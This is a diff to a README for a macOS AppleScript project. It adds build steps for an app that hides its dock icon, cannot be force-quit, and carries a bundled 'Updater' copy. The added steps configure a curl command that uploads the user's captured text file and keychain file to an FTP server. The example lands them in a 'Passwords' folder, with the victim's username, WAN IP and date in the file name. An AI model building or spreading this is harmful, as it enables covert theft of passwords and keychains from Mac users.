@@ -20,16 +20,27 @@ The script is saved as an application with a duplicate application inside of it.
 
  **Please feel free to test the script by doing the following:**
 
-1. Save App.applescript as an application (example name "App.app")
-2. Add the following 2 lines of code to the "info.plist" file in "App.app/Contents/" folder
+1. In 'App.applescript' and 'Updater.applescript' find the command that uploads the text file to an FTP server.
+2. Replace the parts of the code in '<>' with your information.
+
+	* Before:
+
+			tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u <User>:<Password> ftp://<ftp address></path/to/folder/>" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server
+		
+	* After:
+	
+			tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u Benb116:1234 ftp://123.456.789.0/Desktop/Passwords/" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server3. Repeat steps 1 and 2 in both files with the command that uploads the keychain file.
+4. Save App.applescript as an application (example name "App.app")
+5. Add the following 2 lines of code to the "info.plist" file in "App.app/Contents/" folder
 
 		<key>NSUIElement</key>
         <string>1</string>
 (this prevents a dock icon from appearing and also makes it impossible to force quit the app)
-3. Save Updater testing.applescript as an application named "Updater.app"
-3. Repeat step 2 for "Updater.app"
-3. Copy Updater.app to the resources folder "App.app"
+6. Add the file "icon.icns" to the resources folder of "App.app"
+7. Save Updater.applescript as an application named "Updater.app"
+8. Repeat step 5 and 6 for "Updater.app"
+9. Copy Updater.app to the resources folder "App.app"
 
-The resources folder of the main app should look something like this:
+The resources folder of the "App.app" should look something like this:
 
 ![image](http://f.cl.ly/items/2e1H2C3p1L401D1a3944/Screen%20Shot%202012-12-18%20at%207.55.22%20PM.png)
